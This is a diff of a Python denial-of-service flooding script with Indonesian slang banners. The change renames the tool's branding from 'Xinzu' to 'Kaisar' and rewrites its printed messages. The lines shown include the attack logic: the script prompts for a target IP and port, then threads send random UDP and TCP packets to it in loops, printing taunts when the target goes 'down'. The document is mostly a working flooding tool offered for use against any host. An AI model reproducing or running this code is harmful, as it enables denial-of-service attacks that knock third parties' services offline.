@@ -3,13 +3,13 @@ import random
 import socket
 import threading
 
-print       (" - - > Lord Xinzu nih dek!! < - - ")
-print       (" - - > Xinzu Nih Dek!!!! < - - ")
-print       (" - - > Join Xinzu Team <- - ")                                   
+print       (" - - > Lord Kaisar nih dek!! < - - ")
+print       (" - - > Kaisar Nih Dek!!!! < - - ")
+print       (" - - > Join Kaisar Team <- - ")                                   
 print       (" - - > Rename Pm Gw !! < - - ")
-print       (" - - > Xinzu Nih dek  < - - ")
+print       (" - - > Kaisar Nih dek  < - - ")
 print       (" - - > Tuh link nya Join!! < - - ")
-print       (" - - >  XINZU TEAM KATA ILHAM  < - - ")
+print       (" - - >  Ez bet dek!!!  < - - ")
     
 ip = str(input("  Ip:"))
 port = int(input(" Port:"))
@@ -25,9 +25,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Paket From Lord Xinzu!!! ")
+			print(i +" Samlekom Paket dari Kaisar bg!! ")
 		except:
-			print("[!] Down Kntl!!!")
+			print("[!] down dek")
 
 def run2():
 	data = random._urandom(16)
@@ -39,10 +39,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Paket From Lord Xinzu!!! ")
+			print(i +" Samlekom Paket dari Kaisar bg!! ")
 		except:
 			s.close()
-			print("[*] Down Kntl!!!")
+			print("[*] Down Dek!!")
             
 for y in range(threads):
 	if choice == 'y':
